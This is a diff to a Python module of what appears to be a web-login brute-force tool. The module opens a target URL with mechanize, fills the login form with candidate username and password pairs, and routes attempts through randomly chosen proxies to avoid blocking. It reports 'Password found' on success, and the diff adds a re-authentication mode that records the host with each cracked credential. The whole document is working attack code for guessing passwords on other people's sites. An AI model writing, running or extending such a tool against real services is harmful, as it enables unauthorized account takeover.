@@ -1,8 +1,7 @@
 import mechanize
 from core import utils, actions, tbrowser		
 
-def submit(optionURL, tryCred, setProxyList, optionVerbose,\
-	loginInfo, result, optionReauth):
+def submit(options, loginInfo, tryCred, result):
 
 	#	Get login form field informations
 	
@@ -12,21 +11,24 @@ def submit(optionURL, tryCred, setProxyList, optionVerbose,\
 	
 	proc = tbrowser.startBrowser()
 
-	user_agent = tbrowser.useragent()
+	#user_agent = tbrowser.useragent()
 	
 	for cred in list(result.queue):
-		if tryUsername == cred[0]:
-			return 0 # don't run if find password of username
+		if "--reauth" not in options.extras:
+			if tryUsername == cred[0]:
+				return 0 # don't run if find password of username
+		else:
+			if tryUsername == cred[1]:
+				return 0 # don't run if find password of username
 	
-	if setProxyList:
+	if options.proxy:
 		#Set proxy connect
-		proxyAddr = actions.randomFromList(setProxyList)
+		proxyAddr = actions.randomFromList(options.proxy)
 		proc.set_proxies({"http": proxyAddr})
-
 	
 	try:
 
-		proc.open(optionURL)
+		proc.open(options.url)
 
 		#	Select login form
 
@@ -37,12 +39,12 @@ def submit(optionURL, tryCred, setProxyList, optionVerbose,\
 		for field, cred in zip(frmFields, tryCred):
 			proc.form[field] = cred
 
-		page_title = proc.title()
+		#page_title = proc.title()
 		#	Send request
 		proc.submit()
 
-		if optionVerbose:
-			if setProxyList:
+		if options.verbose:
+			if options.proxy:
 				utils.printf("[+] Trying: %s through %s" %(
 					[tryUsername, tryPassword],
 					proxyAddr),
@@ -59,7 +61,7 @@ def submit(optionURL, tryCred, setProxyList, optionVerbose,\
 		
 		if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
 			
-			#proc.reload() #proc.open(optionURL)
+			#proc.reload() #proc.open(options.url)
 			# Reopen index url, if no login form -> loged in (??)
 			# BUG: if url is login url (not index), this might not work
 			# how about blocked messages?
@@ -76,10 +78,11 @@ def submit(optionURL, tryCred, setProxyList, optionVerbose,\
 				else:
 					utils.printf("[*] Password found: %s" %([tryPassword]), "good")
 
-				if not optionReauth:
+				if "--reauth" not in options.extras:
 					result.put([tryUsername, tryPassword])
 				else:
-					result.put([optionURL.split("/")[2], tryUsername, tryPassword])
+					result.put([options.url.split("/")[2], tryUsername, tryPassword])
+				
 			
 			else:
 				# IF USER PROVIDES INDEX URL, THIS CONDITION IS USAULLY TRUE
@@ -88,12 +91,12 @@ def submit(optionURL, tryCred, setProxyList, optionVerbose,\
 					[tryUsername, tryPassword]),
 				"bad")
 				utils.printf("[*] Get page: ['%s']" %(proc.title()), "bad")
-				if optionVerbose:
+				if options.verbose:
 					utils.printf("[*] %s" %(proc.title()), "good")
 
 		else:
-			if optionVerbose:
-				if setProxyList:
+			if options.verbose:
+				if options.proxy:
 					utils.printf("[-] Failed: %s through %s" %(
 						[tryUsername, tryPassword],
 						proxyAddr),
@@ -105,7 +108,7 @@ def submit(optionURL, tryCred, setProxyList, optionVerbose,\
 
 	except mechanize.HTTPError as error:
 		#	Get blocked
-		if optionVerbose:
+		if options.verbose:
 			utils.printf("[x] Attacking: %s %s" %(
 				error,
 				[tryUsername, tryPassword])
@@ -113,7 +116,7 @@ def submit(optionURL, tryCred, setProxyList, optionVerbose,\
 		return False
 
 	except Exception as error:
-		if optionVerbose:
+		if options.verbose:
 			utils.printf("[x] Attacking: %s %s" %(
 				error,
 				[tryUsername, tryPassword]),
